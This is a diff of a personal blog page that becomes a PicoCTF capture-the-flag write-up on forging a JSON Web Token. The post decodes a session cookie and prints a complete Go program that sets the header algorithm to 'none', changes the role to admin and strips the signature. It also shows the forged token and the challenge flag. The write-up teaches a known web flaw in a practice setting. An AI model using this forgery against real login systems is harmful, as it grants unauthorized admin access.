@@ -15,11 +15,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
 
   
-  <title>lavafroth</title>
+  <title>PicoCTF web challenge: JAuth - lavafroth</title>
 
   
   
-  <meta name="description" content="" />
+  <meta name="description" content="The challenge description states that most web application developers use third party components without testing their security. It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at http://saturn.picoctf.net:52025/
+The goal is to become an admin. We are provied with the username test and the password Test123! to look around.
+The challenge is a dummy bank portal. On login, we see the message:" />
   <meta name="author" content="" />
   
 
@@ -27,6 +29,13 @@
   
   <link rel="preload stylesheet" as="style" href="https://lavafroth.github.io/app.css" />
 
+  
+  <link rel="preload stylesheet" as="style" href="https://lavafroth.github.io/an-old-hope.min.css" />
+  <script
+    defer
+    src="https://lavafroth.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
   
 
   
@@ -44,13 +53,6 @@
   <meta name="generator" content="Hugo 0.103.1" />
 
   
-  
-  <link
-    rel="alternate"
-    type="application/rss&#43;xml"
-    href="https://lavafroth.github.io/index.xml"
-    title="lavafroth"
-  />
   
 </head>
 
@@ -78,9 +80,9 @@
 
     
     
-    <a class="sidebar-nav-item" href="./about/" title="About me" style="background: url(/about.svg) center center no-repeat"></a>
+    <a class="sidebar-nav-item" href="../../about/" title="About me" style="background: url(/about.svg) center center no-repeat"></a>
     
-    <a class="sidebar-nav-item" href="./art/" title="Digital art" style="background: url(/art.svg) center center no-repeat"></a>
+    <a class="sidebar-nav-item" href="../../art/" title="Digital art" style="background: url(/art.svg) center center no-repeat"></a>
     
 </nav>
 
@@ -251,87 +253,141 @@
 
     <main class="main">
 
+<article class="post-single">
+  <header class="post-title">
+    <p>
+      <time>Feb 22, 2022</time>
+      
+    </p>
+    <h1>PicoCTF web challenge: JAuth</h1>
+  </header>
+  <section class="post-content"><p>The challenge description states that most web application developers use third party components without testing their security.
+It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at <a href="http://saturn.picoctf.net:52025/">http://saturn.picoctf.net:52025/</a></p>
+<p>The goal is to become an <code>admin</code>.
+We are provied with the username <code>test</code> and the password <code>Test123!</code> to look around.</p>
+<p>The challenge is a dummy bank portal. On login, we see the message:</p>
+<blockquote>
+<p>Hello, You have logged in the testing page. There is nothing to see here.</p>
+</blockquote>
+<p>While logging in, if we check the network requests and responses,
+we can see a cookie named <code>token</code> being set.</p>
+<pre tabindex="0"><code class="language-none" data-lang="none">Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw; path=/; httponly
+</code></pre><p>On taking a closer look, the cookie looks like a <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON web token</a>.
+JSON web tokens comprise three base64 encoded parts, each separated by a <code>.</code>
+These include:</p>
+<ul>
+<li>Header</li>
+<li>Payload</li>
+<li>Verification signature</li>
+</ul>
+<blockquote>
+<p>We can make this educated guess since the value begins with <code>eyJ</code> which partially decodes to <code>{&quot;</code></p>
+</blockquote>
+<p>For this token, we can base64 decode the header and the payload like so:</p>
+<h3 id="header">Header</h3>
+<p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></p>
+<p>decodes to</p>
+<p><code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}</code></p>
+<h3 id="payload">Payload</h3>
+<p><code>eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9</code></p>
+<p>decodes to</p>
+<p><code>{&quot;auth&quot;:1645518293119,&quot;agent&quot;:&quot;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;,&quot;role&quot;:&quot;user&quot;,&quot;iat&quot;:1645518293}</code></p>
+<p>Decoding the signature would result in non-printable characters since it is the base64 representation of the HS256
+or <a href="https://en.wikipedia.org/wiki/HMAC">HMAC</a> <a href="https://en.wikipedia.org/wiki/SHA-2">SHA256</a> digest of the header,
+payload and a 256 bit secret.
+Other algorithms include RSA256 (RSA SHA256), ES256 (ECDSA SHA256) and the like.</p>
+<p>For forging an admin&rsquo;s cookie, we would need to modify the <code>&quot;role&quot;</code> field in the payload to <code>&quot;admin&quot;</code>.
+However, if we do so, the verification signature becomes invalid for the payload. The only way we can
+generate a valid signature is by knowing the 256 bit secret.</p>
+<p>If we pay close attention to the header, we see that the verification algorithm is specified in the cookie.
+We can modify the <code>&quot;alg&quot;</code> field of the header to <code>&quot;none&quot;</code> and omit the verification signature completely.
+The trailing dot following the encoded payload must be present.</p>
+<p>So, I wrote a little Golang program to do just that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;encoding/base64&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;encoding/json&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// modify decodes a base64 encoded part of the token,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// and sets the `whence` field to the value supplied as `what`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">modify</span>(<span style="color:#a6e22e">part</span>, <span style="color:#a6e22e">whence</span>, <span style="color:#a6e22e">what</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// b has the base64 decoded bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">URLEncoding</span>.<span style="color:#a6e22e">DecodeString</span>(<span style="color:#a6e22e">part</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// unmarshal the json data to the structure `p`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{})
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Unmarshal</span>(<span style="color:#a6e22e">b</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">p</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// set the `whence` field to `what`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">p</span>[<span style="color:#a6e22e">whence</span>] = <span style="color:#a6e22e">what</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// marshal the modified structure back to json
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">marshalled</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">p</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// return the modified part, encoded with base64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Replace</span>(<span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">URLEncoding</span>.<span style="color:#a6e22e">EncodeToString</span>(<span style="color:#a6e22e">marshalled</span>), <span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>), <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// print usage if token is not supplied
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Args</span>) &lt; <span style="color:#ae81ff">2</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stderr</span>, <span style="color:#e6db74">&#34;Usage:\n\t%s &lt;token&gt;\n&#34;</span>, <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Args</span>[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// split the parts
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Args</span>[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// set the last part to empty since we would not need it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">2</span>] = <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">part</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">modify</span>(<span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;alg&#34;</span>, <span style="color:#e6db74">&#34;none&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>] = <span style="color:#a6e22e">part</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">part</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">modify</span>(<span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;role&#34;</span>, <span style="color:#e6db74">&#34;admin&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">1</span>] = <span style="color:#a6e22e">part</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">// join the parts back
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Forged token: %v\n&#34;</span>, <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">parts</span>, <span style="color:#e6db74">&#34;.&#34;</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now we run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go run main.go eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw
+</span></span></code></pre></div><p>which gives forged token: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwiYXV0aCI6MTY0NTUxODI5MzExOSwiaWF0IjoxNjQ1NTE4MjkzLCJyb2xlIjoiYWRtaW4ifQ.</code></p>
+<p>Manually setting the cookie to this value, we are redirected to the admin page.</p>
+<blockquote>
+<p>Hello, admin! You have logged in as admin!</p>
+</blockquote>
+<p>and we are greeted with the flag <code>picoCTF{succ3ss_@u7h3nt1c@710n_57072644}</code></p>
+</section>
 
-
-
-
-
- 
-
-
-
- 
-<article class="post-entry">
-  <h2>Google CTF 2022 Treebox</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/google-ctf-2022-treebox/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF I Saw a Little Elf</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-i-saw-a-little-elf/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Hash Me Reloaded</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-hash-me-reloaded/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Hash Me Please</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-hash-me-please/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>Oh my God, they killed Kenny!</h2>
-  <time>Aug 2, 2022</time>
-  <a href="https://lavafroth.github.io/post/oh-my-god-they-killed-kenny/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 3</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail3/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 2</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail2/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 1</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail1/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>Operation Oni, Operation Orchid - Forensics Challenges | PicoCTF 2022</h2>
-  <time>Mar 18, 2022</time>
-  <a href="https://lavafroth.github.io/post/picoctf-2022-forensics-challenges-operation-oni-operation-orchid/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>PicoCTF web challenge: JAuth</h2>
-  <time>Feb 22, 2022</time>
-  <a href="https://lavafroth.github.io/post/picoctf-web-challenge-jauth/"></a>
-</article>
-
-
-
-
-<nav class="main-nav">
   
   
-  <a class="next" href="./page/2/">Next Page →</a>
+
   
-</nav>
-
-
+  
+  
+  <nav class="post-nav">
+    
+    <a class="prev" href="https://lavafroth.github.io/post/picoctf-2022-forensics-challenges-operation-oni-operation-orchid/"><span>←</span><span>Operation Oni, Operation Orchid - Forensics Challenges | PicoCTF 2022</span></a>
+     
+    <a class="next" href="https://lavafroth.github.io/post/liberating-14gib-of-space/"><span>Liberating 14GiB of disk space</span><span>→</span></a>
+    
+  </nav>
+  
+</article>
 </main>
 
     <footer class="footer">
